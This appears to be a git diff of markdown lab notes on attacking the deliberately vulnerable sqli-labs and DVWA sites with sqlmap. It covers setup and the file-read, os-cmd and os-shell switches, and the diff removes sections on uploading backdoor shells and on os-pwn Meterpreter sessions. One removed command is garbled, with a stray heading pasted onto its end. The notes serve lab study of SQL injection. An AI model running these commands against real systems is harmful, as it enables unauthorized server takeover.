@@ -1,6 +1,6 @@
 # Environment Setup:
-- For hacking the sqli-labs website, the setup is explained below: 
-- We have to download two things, xampp server 5.6.39 for Linux and sqli-labs.
+- For hacking the sqli-labs and DVWA website, the setup is explained below: 
+- We have to download three things, xampp server 5.6.39 for Linux and sqli-labs and DVWA website.
 - First download and install xampp server version 5.6.39 on the victim machine. The version must be 5.6.39 as we want to download a php version that is vulnerable (as latest versions are relatively secure) and also because the website we will hack (sqli-labs) uses an older php version \[1].
 	![[Pasted image 20240419212656.png]]
 - Click on "XAMPP Linux" and click on "5.6.39" to download it.
@@ -9,7 +9,9 @@
 - note: the server will be downloaded to `/opt/`
 - Now download sqli-labs from github \[2] as follows, and unzip/extract it.
 	![[Pasted image 20240419213635.png]]
-- Now copy the sqli-labs folder that was extracted to `/opt/lampp/htdocs/`
+- Next download DVWA from their github website like so, and also extract it:
+	![[Pasted image 20240420185507.png]]
+- Now copy the sqli-labs and DVWA folders that was extracted to `/opt/lampp/htdocs/`
 	![[Pasted image 20240419213857.png]]
 - setting up xampp server is very easy, just "start" the services "Apache Web Server" and "MySQL Database" as shown below:
 	![[Pasted image 20240419214231.png]]
@@ -43,26 +45,6 @@ sqlmap -u "http://example.com/page.php?id=1" --file-read /path/to/index.php
 	![[Pasted image 20240419221458.png]]
 - As expected, when we go to that location, it is visible:
 	![[Pasted image 20240419221711.png]]
-## Writing Files:
-- Use `file-write` switch followed by the local file path to upload and `file-dest` switch followed by the location to write on the target server.
-- Example command: 
-```sh
-sqlmap -u "http://example.com/page.php?id=1" --file-write /path/to/local/file --file-dest /path/to/target/directory
-```
-- Here is the command:
-	
-
-```sh
-sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=6757&Submit=Submit#" --cookie="PHPSESSID=qohgh4uvii3mqobepks2q54do1; security=low" -w ./a.txt --file-read /var/www/html/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt --batch Uploading Backdoor Shells:
-```
-
-- Locate the desired shell file using system commands like *locate*.
-- Upload the shell using the same `file-write` and `file-dest` switches.
-- Example command:
-```bash
-sqlmap -u "http://example.com/page.php?id=1" --file-write /path/to/shell.php --file-dest /path/to/target/directory
-```
-- Verify shell access and execute commands through the uploaded shell.
 ## Considerations:
 - Ensure proper file permissions and user privileges for successful file operations.
 - Be mindful of file size limitations based on web server configurations.
@@ -78,7 +60,6 @@ SQLMap provides functionalities that enable an attacker to execute commands on t
 SQLMap's help menu lists several switches under the "Operating System Access" section that facilitate operating system takeover. We will use the following ones:
 - `--os-cmd`
 - `--os-shell`
-- `--os-pwn`
 ## Execution of System Commands
 ### The `--os-cmd` Switch
 #### Description
@@ -110,31 +91,8 @@ sqlmap -u <target_URL> --os-shell
 		![[Pasted image 20240420033602.png]]
 	- Here we see that a file `john` was created in the server machine:
 		![[Pasted image 20240420033650.png]]
-## 4. Advanced Techniques
-### 4.1. `--os-pwn` Switch
-#### Description
-The `--ospwn` switch allows spawning an interactive command prompt, a Meterpreter session, or a graphical user interface VNC session.
-
-#### Procedure
-1. Use the `--ospwn` switch followed by the desired option.
-2. Provide additional platform-related information, such as language support and location.
-3. SQLMap automates the process of creating and uploading the necessary payloads.
-
-#### Example (Meterpreter Session)
-```bash
-sqlmap -u <target_URL> --ospwn
-```
-
-#### Example (VNC Session)
-```bash
-sqlmap -u <target_URL> --ospwn
-```
-
-## 5. Conclusion
-By leveraging SQLMap's capabilities, attackers can effectively take over the target operating system, execute system commands, and establish persistent access. However, it's crucial to use such tools responsibly and only in authorized penetration testing scenarios.
-
-This documentation provides a comprehensive guide to operating system takeover with SQLMap, enabling security professionals to understand and mitigate potential risks associated with SQL injection vulnerabilities.
-
+## Conclusion
+By leveraging SQLMap's capabilities, attackers can effectively take over the target operating system, execute system commands, and establish persistent access.
 # References
 \[1] https://sourceforge.net/projects/xampp/files/XAMPP%20Linux/
 \[2] https://github.com/Audi-1/sqli-labs
